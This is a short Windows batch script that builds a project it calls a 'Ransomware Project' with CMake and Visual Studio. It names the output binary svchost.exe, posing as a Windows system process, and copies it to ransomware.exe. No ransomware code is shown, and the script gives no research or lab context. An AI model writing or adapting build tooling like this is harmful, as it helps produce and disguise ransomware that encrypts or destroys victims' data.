@echo off
setlocal

echo [*] Building Ransomware Project...

if not exist "build" mkdir build
cd build

echo [*] Running CMake...
cmake .. -G "Visual Studio 17 2022" -A x64

if %ERRORLEVEL% NEQ 0 (
    echo [!] CMake configuration failed
    pause
    exit /b 1
)

echo [*] Building Release configuration...
cmake --build . --config Release

if %ERRORLEVEL% NEQ 0 (
    echo [!] Build failed
    pause
    exit /b 1
)

echo [*] Build completed successfully
echo [*] Binary located at: build\bin\Release\svchost.exe

echo [*] Copying to project root...
copy "bin\Release\svchost.exe" "..\ransomware.exe"

cd ..
endlocal
pause
